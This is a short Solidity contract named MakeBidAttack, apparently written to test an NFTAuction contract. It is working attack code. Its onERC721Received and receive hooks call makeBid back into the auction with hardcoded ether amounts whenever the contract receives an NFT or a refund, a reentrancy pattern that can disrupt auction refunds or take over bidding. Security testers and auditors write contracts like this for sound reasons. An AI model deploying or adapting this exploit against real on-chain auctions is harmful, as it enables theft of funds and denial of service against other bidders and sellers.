// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721.sol";
import "./NFTAuction.sol";
import "./TestNFT.sol";

contract MakeBidAttack {
    NFTAuction nftAuction;
    TestNFT nftToken;
    address auctionAddress;
    address nftAddress;
    uint256 tokenId;
    address nftOwner;

    constructor() {}

    function setInfo(
        address _auctionAddress,
        address _nftAddress,
        uint256 _tokenId,
        address _nftOwner
    ) external {
        nftAuction = NFTAuction(_auctionAddress);
        nftToken = TestNFT(_nftAddress);
        auctionAddress = _auctionAddress;
        nftAddress = _nftAddress;
        tokenId = _tokenId;
        nftOwner = _nftOwner;
    }

    function makeBid(uint256 _tokenId) external payable {
        nftAuction.makeBid{value: msg.value}(address(nftToken), _tokenId);
    }

    function onERC721Received(
        address operator,
        address from,
        uint256 _tokenId,
        bytes calldata data
    ) external returns (bytes4) {
        nftAuction.makeBid{value: 5 ether}(address(nftToken), _tokenId);
        return
            bytes4(
                keccak256("onERC721Received(address,address,uint256,bytes)")
            );
    }

    fallback() external payable {
    }

    receive() external payable {
        nftAuction.makeBid{value: 10 ether}(address(nftToken), tokenId);
    }
}
